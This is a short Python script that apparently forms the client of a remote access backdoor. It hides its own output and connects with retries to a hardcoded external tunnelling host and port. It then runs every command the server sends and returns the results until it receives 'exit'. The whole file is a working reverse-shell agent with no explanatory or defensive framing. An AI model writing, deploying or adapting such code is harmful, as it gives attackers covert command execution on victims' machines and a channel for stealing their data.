#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Import modules
import Core.server as Server
import Core.commands as Command
import sys
import time
from os import system, name, devnull

# Redirect stdout and stderr to /dev/null to suppress log messages
sys.stdout = open(devnull, 'w')
sys.stderr = open(devnull, 'w')

# Change default encoding if running on Windows
if name == "nt":
    system("chcp 65001 > " + devnull)

# Default server settings
SERVER_HOST = "rasep59-52984.portmap.host"
SERVER_PORT = 52984

# Function to establish a connection with retry logic
def connect_with_retry(host, port, retries=5, delay=5):
    for attempt in range(retries):
        try:
            server = Server.ConnectServer(host, port)
            return server
        except Exception as e:
            time.sleep(delay)
            continue
    raise ConnectionError(f"Failed to connect to server at {host}:{port} after {retries} attempts.")

# Connect to server with retry logic
server = connect_with_retry(SERVER_HOST, SERVER_PORT)

command = ""
while command.lower() != "exit":
    try:
        # Receive commands from server
        command = server.Read()
        # Run command
        output = Command.Run(command, server)
        # Send command response
        server.Send(output)
    except Exception as e:
        # Handle any potential errors during communication
        continue

# Close connection
server.Disconnect()
